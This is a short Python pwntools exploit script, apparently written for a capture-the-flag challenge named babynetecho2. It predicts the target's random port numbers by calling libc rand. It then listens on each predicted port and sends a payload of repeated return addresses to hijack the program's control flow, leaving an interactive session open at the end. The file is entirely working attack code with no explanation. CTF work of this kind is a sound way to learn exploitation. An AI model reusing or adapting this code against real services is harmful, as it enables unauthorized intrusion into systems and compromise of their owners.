#!/usr/bin/env python
from pwn import *
import ctypes

libc = ctypes.cdll['libc.so.6']
rand = lambda: libc['rand']() % 0x10000

#their_ip = 'babynetecho.mitctf.edu'
their_ip = '18.181.0.78' # from http://mitctf.com/endpoints.txt, DNS issues

p = process(['./babynetecho2']) if '--live' not in sys.argv else remote(their_ip, 4400)
gdb.attach(p)
p.sendline(raw_input('ip to tell babynetecho> '))

for i in range(14):
    port = rand()
    print('iteration %d, port %d' % (i, port))
    s = listen(port, '0.0.0.0')
    #s.sendline(p32(0x080486db)*0x10)
    #s.sendline(p32(0x080486cb)*0x10)

    #s.sendline((p32(0x080484d0)+p32(0x8048970))*8)
    s.sendline(p32(0x080486d4)*0x10)
    s.close()

p.interactive()
